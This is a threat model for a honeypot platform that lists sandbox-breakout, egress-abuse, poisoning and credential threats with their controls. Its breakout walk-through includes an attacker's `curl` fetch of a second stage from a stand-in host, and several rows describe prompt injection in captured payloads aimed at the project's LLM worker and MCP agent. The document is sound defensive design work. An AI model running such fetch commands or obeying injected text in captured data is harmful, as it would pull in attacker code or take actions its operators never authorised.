# Foiled threat model

Status: Accepted, 17 October 2026. Owner: #2. Review this document whenever a component in ADR 0001 (#1) changes shape.

Foiled's job is to be attacked. The usual model, where the attacker starts outside and we keep them out, is upside down here: the attacker starts inside a sandbox we invited them into. This document lists what can go wrong when we deliberately run vulnerable software, who might break out, what they could reach, and which Australian legal and ethical limits the project chooses to follow. Every containment and egress decision in later issues traces back to a requirement in this file.

This is analysis and requirements, not legal advice. Where it touches law, it records design constraints the project follows. Operators must seek their own legal advice for their circumstances.

## Scope and assets

Components are the ones named in ADR 0001 (#1) and the platform split in ADR 0009 (#40):

- **Trusted zone, on Cloudflare:** API Worker (#21), console Worker (#14, #39), public pages (#35), queue consumers (ingest, enrichment #11, LLM correlation #28, exports #13), D1, Postgres via Hyperdrive, Durable Objects, Queues, R2, AI Gateway, Analytics Engine, MCP server (#24, `POST /v0/mcp` on the API Worker, a pure client of the API routes).
- **Hostile zone, on our hosts:** sandbox hosts running decoys (sandboxes #3, emulators and decoy modules #30), the network boundary (#4), capture (#9), instrumentation hooks (#32), canaries (#17) and the host agent (#41).
- **Hostile zone, on someone else's host:** edge sensors (#31).
- **Build side:** image builder (#6) and the catalogue (#5).

Assets worth protecting, in rough order:

1. The control plane: admin and operator credentials, API tokens, Worker secrets, the Cloudflare account itself.
2. Third parties on the internet who could be harmed by our hosts (scanning, spam, DDoS, C2, hosting stolen data).
3. Integrity of captured evidence, attempts and intel (if it can be poisoned, our CVE and actor assessments mislead people).
4. Personal information in capture data (IPs, request bodies, stolen data inside payloads) (#16).
5. Sandbox host integrity (the host kernel, the host agent, its mTLS key).
6. Tenant separation once more than one operator org exists (#31).
7. Project reputation: Foiled must never become a tool for someone else's crime.

## Adversaries

| Adversary | Starting point | Goal |
| --- | --- | --- |
| Opportunistic attacker | Internet, hits a decoy | Exploit, drop a miner or bot, move on |
| Skilled attacker who suspects a honeypot | Root inside a sandbox guest | Break out to the host, pivot, burn or poison the sensor |
| Attacker using us as infrastructure | Code execution in a decoy | Scan, spam, host phishing, relay C2 through our IPs |
| Data poisoner | Sends crafted traffic | Mislead CVE, ATT&CK or actor mapping; inject prompts into the LLM worker; XSS the console |
| Supply-chain attacker | Upstream package, base image or decoy module image | Get code into the builder, a decoy module or our CI |
| Credential thief | Phishing, malware on an operator laptop, leaked token | Control-plane access, mass decoy creation, data theft |
| Rogue or compromised edge sensor operator | Owns the edge host (#31) | Forge events, read other tenants, gain admin |

## STRIDE by component

S spoofing, T tampering, R repudiation, I information disclosure, D denial of service, E elevation of privilege. Each row names the main threat and the control or the issue that owns it.

| Component | Threats (STRIDE) | Controls and owners |
| --- | --- | --- |
| Catalogue (#5) | T: malicious entry points at a hostile image or claims false CVEs. | Entries need review to reach `verified`; sandbox entries pinned by digest; lint in CI (#19). |
| Image builder (#6) | T, E: poisoned upstream source or base image; builder used to reach the network during build. | Base images pinned by digest, `sources.lock` hashes, `--network=none` after fetch, builder is never a honeypot host, SBOM per image. |
| Sandbox runtime (#3) | E: guest to host breakout through the kernel, virtio devices or a container escape. D: resource exhaustion. | Firecracker with KVM as the internet-facing default; jailer, seccomp, cgroups limits; Docker fallback forbidden for public exposure; no privileged containers or host networking. |
| Emulators and decoy modules (#30) | E: parser bugs in emulator code or upstream GPL modules. T: module writes forged events. | One container per module with seccomp and no new privileges, read-only root, deny-by-default egress; events validated against the capture schema; modules never linked into core. |
| Network boundary (#4) | E, I: route from sandbox to control plane, host agent, other sandboxes or the internet. | Per-sandbox namespace or tap, default-deny forward chain, no route to host IPs, egress only via logging proxy allow-list, internal logging resolver. |
| Capture (#9) | T: guest alters or deletes evidence. I: quarantine served back out. | Capture is host-side or boundary-side; in-guest agents are untrusted; quarantine never mounted writable into a decoy; R2 bucket private. |
| Instrumentation hooks (#32) | T: attacker tampers with hook code in the guest. D: hook crash takes the decoy down. | Hooks maintained in the trusted tree and baked into the image; they fail closed (decoy keeps running, hook event missing); hook events are evidence, not commands. |
| Host agent (#41) | S: forged or replayed jobs. E: agent used as a shell. I: stolen host certificate. | Jobs signed by the control plane with expiry and idempotency key; digest allow-list; fixed job types, no free-form shell; outbound-only mTLS; host role scope limited to its own jobs and evidence. |
| Edge sensors (#31) | S: forged events from a stolen certificate. E: sensor identity used to reach admin APIs or other tenants. | mTLS at the WAF and a second certificate check in the Worker; sensor role scope; `tenant_id` bound to the identity; anomaly flag on IP or ASN jumps; revocation. |
| Ingest Worker and queues (#9, #31) | T: malformed or oversized envelopes. D: flood fills the queue. R: events without a source identity. | Schema validation before enqueue; 128 KB message cap with `payload_ref` for anything larger; per-identity rate limits; identity stamped from the certificate, never from the body. |
| API Worker (#21) | S: stolen bearer token. E: scope confusion between human, MCP, sensor and host tokens. R: unaudited writes. | Scoped tokens with distinct roles; rotate and destroy require `reason`; every write audited (#21); rate limits on create and destroy. |
| Console Worker (#14, #39) | T, I: attacker-controlled strings (payloads, User-Agents, paths) rendered as HTML (stored XSS). S: CSRF. | React escaping by default, no `dangerouslySetInnerHTML` for capture data, strict CSP, CSRF protection, Cloudflare Access in front. |
| MCP server (#24) | E: prompt injection in attempt data convinces an agent to call write tools. D: agent floods decoy creation. | MCP is operator-side only and a pure API client; `mcp` tokens hold least-privilege scopes only; agent caps on calls, creates, live sandboxes and lifetime; destructive tools need `confirm` and a `reason`; attacker text escaped and framed as untrusted; every call audited ([mcp/foiled-mcp.md](mcp/foiled-mcp.md)). |
| Enrichment (#11) | I: leaking operator data to providers. T: provider returns hostile data. | Only observables (IP, hash, domain) are sent, never payloads; keys in Worker secrets; provider output treated as untrusted text. |
| LLM correlation (#28) | T, E: prompt injection in payloads tries to raise its own confidence or trigger actions. I: payloads and personal information sent to a provider. | Untrusted content delimited; tool use disabled; schema-only output; LLM evidence capped below `high` (#27); redaction before prompt; AI Gateway logging set per #16. |
| Confidence and intel (#12, #26, #27, #29, #33) | T: poisoned evidence drives a wrong public assessment. | Deterministic scoring with evidence lists; analyst confirm before `confirmed`; "we assess as" and "possible association" wording; never auto-publish below `publish_min`. |
| Exports and public pages (#13, #35, #37) | I: tenant data or third-party enrichment leaks into public output. | Redaction and delay rules, second reviewer checklist, never include paid enrichment fields (#38). |
| Data stores (D1, Postgres, R2) | I: over-retention of personal information. T: direct writes bypassing audit. | Retention TTLs and purge job (#16); only Workers hold store credentials; hosts and sensors hold none. |
| Cloudflare account | E: account takeover gives everything. | Hardware-key MFA for account members, least-privilege API tokens, no account IDs or tokens in the repo, Worker secrets only. |

## Sandbox breakout

What we assume: an attacker will get root inside some guest. Kernel exploits for guest kernels are common, and some decoys are deliberately old.

Layers between guest root and the host:

1. **Hypervisor boundary.** Firecracker micro-VMs on KVM are the default for internet-facing sandboxes (#3). The guest kernel is not the host kernel. Firecracker exposes a minimal device model (virtio-net, virtio-block, vsock off unless needed, serial console).
2. **Jailer.** Each Firecracker process runs under the jailer: its own chroot, PID and mount namespaces, a dedicated unprivileged UID and GID, cgroup limits and a seccomp filter.
3. **Host hardening.** No other workloads on the sandbox host, current kernel with KVM patches, unattended security updates, no SSH on public IPs.
4. **Disposable guests.** Compromised or aged guests are destroyed and rebuilt from digest, never rebooted into service (#8).

For emulators and decoy modules, the boundary is a container: separate user namespace, seccomp default profile, `no-new-privileges`, read-only root, all capabilities dropped. That is weaker than a VM, which is why emulators parse only the protocol subset they claim and why the Docker-fallback runtime is forbidden as the default for internet exposure.

Containment requirements:

- **C1** Internet-facing sandbox decoys run under a hypervisor boundary (Firecracker with KVM). Docker without a VM is allowed only for local development and labs, and the runtime refuses it when the host is marked `publicly_exposed` (#3, #24).
- **C2** No privileged containers, no host networking, no host PID or IPC namespaces, no Docker socket inside any decoy (#3, #30).
- **C3** Each Firecracker VM runs under the jailer with a unique UID, cgroup CPU, memory and PID limits, and a seccomp filter (#3).
- **C4** A guest flagged as compromised is never restarted from its current disk. Rotation always rebuilds from the catalogue digest (#8).
- **C5** No secret in guest memory or on guest disk unlocks anything outside the guest. Only canaries (#17) and decoy-local fake credentials live there.

## Lateral movement between sandboxes

- **C6** Each decoy has its own network namespace or tap on its own small subnet in `10.85.0.0/16`; the forward chain drops sandbox to sandbox traffic, including hairpin through the frontend IP (#4).
- **C7** Decoys share no writable volumes. Capture and quarantine paths are host-side and never mounted writable into a guest (#9).
- **C8** Decoy modules (#30) run one per container on separate networks; a compromise of one module cannot reach another module's listener.

## Egress abuse

A compromised decoy is attractive as free infrastructure: scanning, spam, credential stuffing, DDoS, phishing hosting, C2 relay, proxying.

- **C9** Egress from every decoy is default deny. There is no outbound TCP or UDP except to the logging egress proxy and the internal resolver (#4).
- **C10** The egress proxy allow-list is empty by default. Anything added is logged per request, can return canned responses, and is reviewed in the decoy's catalogue entry (#4, #5).
- **C11** SMTP (25, 465, 587), IRC and raw outbound UDP are never on any allow-list.
- **C12** DNS queries go only to the internal resolver, which logs them and can sinkhole. Direct DNS to the internet is dropped (#4).
- **C13** Rate limits on the proxy per decoy. A hit on a blocked destination counts as a compromise signal that can trigger rotation (#8, #15).
- **C14** Inbound published ports are the only ingress. The host's management services do not listen on public interfaces (#4, #7, #41).

## Pivot to the control plane

- **C15** The control plane runs on Cloudflare, not on the sandbox host (#40). Hosts and sensors dial out over mTLS to a dedicated ingest hostname. The control plane never opens a connection into a host (#41).
- **C16** Sandboxes have no route to the host agent, its local sockets or any host IP. The host agent runs in the host namespace (#4, #41).
- **C17** Hosts and sensors hold no database credentials, no admin tokens and no Cloudflare API tokens. Their mTLS identity can lease their own jobs and post their own evidence, and nothing else (#21, #31, #41).
- **C18** Large artefacts go to R2 through short-lived, single-object upload URLs. They never pass through a Worker request body, and the URL cannot list or read other objects (#9).
- **C19** Jobs from the control plane are signed, carry an expiry and an idempotency key, and are checked against a local allow-list of catalogue digests (#41).

## Poisoning of the capture store

Everything an attacker sends is evidence and also attack surface for our own tooling.

- **C20** Capture events are validated against `schemas/capture-event.schema.json` at ingest and stamped with the source identity from the client certificate (#9, #31).
- **C21** Evidence is append-only. Analyst overrides are recorded as new audited rows, never as edits to raw events (#25, #27).
- **C22** Payloads, headers, paths and file contents are untrusted text everywhere: escaped in the console, never evaluated, never executed on the control plane (#14, #34).
- **C23** The LLM worker treats retrieved and captured text as data. Untrusted content is delimited, tool use is off, output must match a schema, and LLM evidence cannot reach `high` alone (#27, #28).
- **C24** Confidence is computed from evidence, never accepted from an event. An edge sensor cannot set a CVE link or score on its own data (#27, #31).
- **C25** Quarantined files are stored by SHA-256 in a private R2 bucket and only downloadable after a double confirm in the console, default off (#9, #14).

## Supply chain

- **C26** Base images and upstream sources are pinned by digest or hash; builds run without network after the fetch step; each image has an SBOM (#6).
- **C27** Third-party decoy module images are pinned by digest and recorded with their licence in the compliance register (#30, #38).
- **C28** CI uses no secrets on pull requests, pins actions to major versions from known publishers, and runs `cargo clippy` and tests on every change (#19).
- **C29** Host agent and edge sensor self-update only from signed releases (#31, #41).

## Operator credential theft

- **C30** The console sits behind Cloudflare Access or an equivalent identity proxy. It is never publicly reachable without auth (#7, #14).
- **C31** API tokens are scoped (`decoys:write`, `attempts:read`, `exports:read`, `host:*`, `sensor:*`, and so on), short-lived where possible, and audited (#21).
- **C32** Destructive and expensive actions (destroy, rotate, bulk export, malware download) require a `reason` and are rate limited (#21, #24).
- **C33** Cloudflare account members use hardware-key MFA. API tokens used for deployment are scoped to the specific Workers and resources.

## Breakout walk-through

Scenario: an attacker gets root in a sandbox guest, then tries to reach the control plane and the public internet.

| Step | Attacker action | What stops it | Residual risk |
| --- | --- | --- | --- |
| 1 | Exploits the demo app, gets a shell as the app user. | Nothing, by design. Capture records it (#9), hooks fire (#32). | Expected. |
| 2 | Escalates to root in the guest with a kernel exploit. | Nothing inside the guest, by design. The guest kernel is disposable. | Expected. |
| 3 | Tries to read credentials for the control plane from guest disk or memory. | C5: there are none. Only canaries, which alert when used (#17). | None. |
| 4 | Tries `curl https://example.com` to fetch a second stage. | C9, C10: egress default deny; request is logged by the proxy or dropped by the forward chain. C13: blocked attempt raises a rotation signal. | Low: allow-listed destinations could be abused if an operator adds them carelessly (R7). |
| 5 | Tries DNS tunnelling. | C12: only the internal resolver answers; queries are logged and can be sinkholed. | Low: data can leak through query names to the resolver log, which stays on the host. |
| 6 | Scans `10.85.0.0/16` for other decoys. | C6: forward chain drops sandbox to sandbox traffic. | None at the network layer. |
| 7 | Tries to reach the host's IPs, the host agent or the Cloudflare ingest hostname. | C15, C16: no route to host IPs; the agent dials out from the host namespace; the sandbox has no egress to Cloudflare. | None at the network layer. |
| 8 | Attempts a Firecracker or KVM escape. | C1, C3: jailer, seccomp and cgroups contain the VMM process; it runs as an unprivileged UID in a chroot. | Medium: a VMM or KVM zero-day is possible (R1). |
| 9 | After a hypothetical escape, steals the host agent's mTLS key. | C17: the key only leases this host's jobs and posts this host's evidence. C24: it cannot set confidence. Revocation (#31). | Medium: forged evidence from one host until revoked (R4). |
| 10 | Uses the host to attack the internet. | Host firewall egress limited to the ingest hostname, R2 and update endpoints; provider abuse monitoring. | High if the escape succeeds (R1), which is why rotation and host rebuild exist (#8). |

## Legal and ethical limits (Australia)

The project's position, which every contribution must respect:

- **Foiled observes only traffic that arrives at the honeypot.** It never initiates contact with attacker infrastructure. No scanning back, no fetching attacker URLs from the control plane, no logging in to attacker C2, no takedown actions.
- **Foiled will never implement offensive actions against attackers.** "Hack back" is out of bounds for this project, whatever the operator's intent.

The design constraints below follow from Australian law as we read it. They are not legal advice. Operators should get their own advice before exposing a honeypot, particularly if they are in an organisation with regulatory obligations or plan to share data.

- **Criminal Code Act 1995 (Cth), Part 10.7 (computer offences).** Unauthorised access to, modification of, or impairment of data or electronic communications is an offence, and there is no general self-defence exception for accessing an attacker's systems. This is why hack back, active retrieval of attacker payloads from their servers, and any action against third-party systems are excluded. It is also why egress containment matters: if a decoy we run is used to attack someone else, we do not want our infrastructure to be the instrument. The same Part covers possession or supply of data with intent to commit an offence, which is one reason the repository holds no working exploit code, only matchers and links to public advisories (#5, #12).
- **Privacy Act 1988 (Cth).** IP addresses, request bodies and data stolen from other victims that turns up in payloads can be personal information when they identify, or could reasonably identify, an individual. The project therefore minimises by default: hashes of request bodies instead of full bodies, TTLs and purge jobs, and private storage (#16). Whether the Australian Privacy Principles apply to a given operator depends on who they are; operators should check.
- **Telecommunications (Interception and Access) Act 1979 (Cth).** Recording the content of communications passing over a telecommunications system can be interception. A honeypot generally records communications sent to a system the operator owns and runs, but packet capture on shared links, capture of traffic not addressed to the honeypot, and capture of egress traffic raise questions. Foiled captures only on the operator's own hosts and interfaces and only traffic to and from its own decoys. Operators should take advice before changing that.
- **Unwitting victims.** Payloads can contain data stolen from other people. Treat it as sensitive, do not publish it, and follow the redaction rules in #35 and the delay rules in #37.
- **No entrapment theatre.** Decoys pretend to be ordinary vulnerable software. They do not impersonate real third-party organisations, banks or government systems (#18).

## Operator responsibilities checklist

Before exposing a Foiled decoy on a public IP, the operator confirms:

1. They own or are authorised to run vulnerable software on the host, network and IP range, and the hosting provider's terms allow honeypots.
2. Egress default deny is in place and the four network tests in ADR 0003 pass (#4).
3. The decoy runs under the Firecracker runtime, not the Docker fallback (#3).
4. Retention TTLs are set and the purge job is enabled; `store_payloads` is off unless they have a reason (#16).
5. The console is behind Cloudflare Access or an equivalent, and API tokens are scoped and stored outside the repo (#7, #21).
6. They know who can read capture data and quarantined files, and access is limited to them.
7. They will not use collected intel to take action against third-party systems, and will share only per the contribute-back and data-terms rules (#37, #38).
8. They have a plan for a reported sandbox escape: take the host offline, revoke its certificate, rebuild (#8, #31).
9. They have read `SECURITY.md` and know how to report a containment bug privately (#20).

## Residual risk register

| ID | Risk | Severity | Owning issue |
| --- | --- | --- | --- |
| R1 | Firecracker or KVM escape gives the attacker the sandbox host. | Critical | #3 (runtime hardening, jailer), #8 (rebuild hosts), #41 (no secrets on host beyond its own identity) |
| R2 | Docker fallback used on a public IP, making a container escape the only barrier. | High | #3 (refuse fallback when `publicly_exposed`), #24 (MCP refuses it), #22 (walkthrough warns) |
| R3 | Egress allow-list entry abused for scanning or C2. | High | #4 (proxy logging and rate limits), #8 (blocked-egress rotation trigger), #15 (alert) |
| R4 | Stolen host or sensor certificate used to forge evidence or flood ingest. | High | #31 (revocation, anomaly detection, scoped roles), #41 (host role), #27 (confidence never accepted from events) |
| R5 | Stored XSS in the console from attacker-controlled strings. | High | #14 (escaping, CSP), #39 (components render text only) |
| R6 | Prompt injection makes the LLM worker propose high-confidence false links. | High | #28 (delimiting, schema, no tools), #27 (LLM cap below `high`) |
| R7 | Operator credential or Cloudflare account takeover. | Critical | #7 (Access in front of console), #21 (scoped tokens, audit), #20 (security guidance) |
| R8 | Supply-chain compromise of a decoy module or base image. | High | #6 (digest pinning, SBOM, offline build), #30 (module digests), #38 (register) |
| R9 | Over-retention of personal information in pcaps and payloads. | Medium | #16 |
| R10 | Tenant data leaks into public write-ups or exports. | High | #35 (checklist fails on tenant ids), #13 (filters), #37 (delays) |
| R11 | Capture disk fills and evidence is lost, or the host stalls. | Medium | #9 (disk caps), #15 (`capture_disk_pressure` alert) |
| R12 | Decoy fingerprinted as a honeypot and fed poisoned traffic on purpose. | Medium | #18 (fingerprint resistance, Honeyscore self-check), #27 (evidence-based scoring) |
| R13 | Malware downloaded from quarantine and run by an analyst by mistake. | Medium | #14 (double confirm, default off), #9 (never served publicly) |
| R14 | Legal exposure from capture beyond the operator's own systems. | Medium | #4 (capture only on own interfaces), #16 (minimisation), this document |

## Change process

A change that weakens any `C` requirement above needs an ADR and a link back to this file. New components add a row to the STRIDE table and, where needed, the risk register.
